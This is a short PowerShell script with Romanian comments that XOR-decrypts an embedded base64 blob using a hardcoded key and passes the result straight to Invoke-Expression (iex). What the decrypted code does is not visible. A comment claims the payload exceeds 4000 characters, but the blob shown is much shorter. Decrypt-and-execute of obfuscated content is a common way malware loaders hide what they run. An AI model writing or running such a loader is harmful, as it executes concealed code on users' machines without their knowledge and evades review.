# 🔐 Cod protejat - criptat XOR + base64, cu cheia inclusă

function Decrypt-Codrut {
    param (
        [string]$data,
        [string]$key = "codrut123"
    )

    $bytes = [System.Convert]::FromBase64String($data)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = $bytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}

# 🔒 Cod criptat (peste 4000 caractere)
$encrypted = @'
jNTbMxEQHGZKEwpEXzQHQldeAQMdPBQZVBJgGhwQFxhaZltdBwATAVsyXkBeEGUlFhFZZUtDBk9JMwYHVF9RDxYqExgREWFKEBsBH1swQ1NECgEDeH9XEXFcB08KEwEdRxJDF08GHhoXUEBWQ6f9G1UAUEFYAQ4WeDQQVR9nGh8BUjVWO0dACgEDUiYNQkZWDlRuBwYdX1UTMBYXBhAZH2BGDRsNHxBaeFxHBh0LAiYRQ0RaAAoXSX8ERFBfCgxEERkVQkETLQ4QGwMREUk5Q09EUi4wXV56Dh8LAAFcE0dA
'@

# ▶️ Decriptează și execută
$code = Decrypt-Codrut -data $encrypted
iex $code
